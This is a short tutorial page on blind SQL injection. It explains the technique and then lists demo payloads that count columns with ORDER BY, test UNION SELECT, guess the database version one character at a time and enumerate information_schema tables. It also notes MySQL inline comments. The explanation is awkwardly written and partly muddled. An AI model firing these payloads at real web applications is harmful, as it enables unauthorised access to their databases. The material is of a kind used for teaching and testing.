---
id: blindSQL
title: Introduction to Blind SQL
sidebar_label: Blind SQL
---
BLIND SQL INJECTION
===================
	Blind SQL injection is a type of sql injection attack that ask the database true or false questions and determine the answer based on the application response. This attack is often used when the web application is configured to show generic error message, but has not mitigated the code that is vulnerable to SQLi. This type of sql injection is identical to normal sql injection, the only is the data retreived from the database.
	1. Blind Boolean
	2. Time Based SQL Injection

http://newsletter.com/items.php?id=2
------------------------------------
select title,description from items where id=2
----------------------------------------------

http://newsletter.com/items.php?id=2 and 1=2

select title,description from items where id=2 and 1=2

Demo
====
	1
	1' 
	1' and 1=0 # ---> False
	1' and 1=1 # ---> True
	1' and 1=0 order by 1 # --> No Result ---> Generic error
	1' and 1=1 order by 1 # --> Result --> normal result
	1' and 1=0 order by 2 # --> No result
	1' and 1=1 order by 2 # ---> Result
	1' and 1=0 order by 3 # ---> No Result
	1' and 1=1 order by 3 # ---> No Result ---> True ---> there are 2 number of columns
	1' and 1=0 union select 1,2 #
	1' and 1=1 union select 1,2 #
	1' and 1=0 union select NULL,2 # --> nO dATA
	1' and 1=1 union select null,2 #---> 	 Shows Data
	1' and 1=0 union select null,substr(@@version,1,1)=5 #
	1' and 1=0 union select null,substr(@@version,1,1)=4 #
	1' and 1=0 union select null,substr(@@version,1,1)=3 #
	1' and 1=0 union select null,substr(@@version,1,1)=2 #
	1' and 1=0 union select null,substr(@@version,1,1)=1 #
	1' and 1=0 union select null,substr(@@version,2,1)=1 #
	1' and 1=0 union select null,substr(@@version,2,1)=2 #
	1' and 1=0 union select null,substr(@@version,2,1)=3 #
	1' and 1=0 union select null,substr(@@version,2,1)=0 #
	1' and 1=0 union select null, table_name from information_schema.tables #



/*! */





read only comments 
r and w comments 
inline executable comments 

/*!   */
50000 
1' and 1=0 union select 1,substr(version(),1,1)='5' #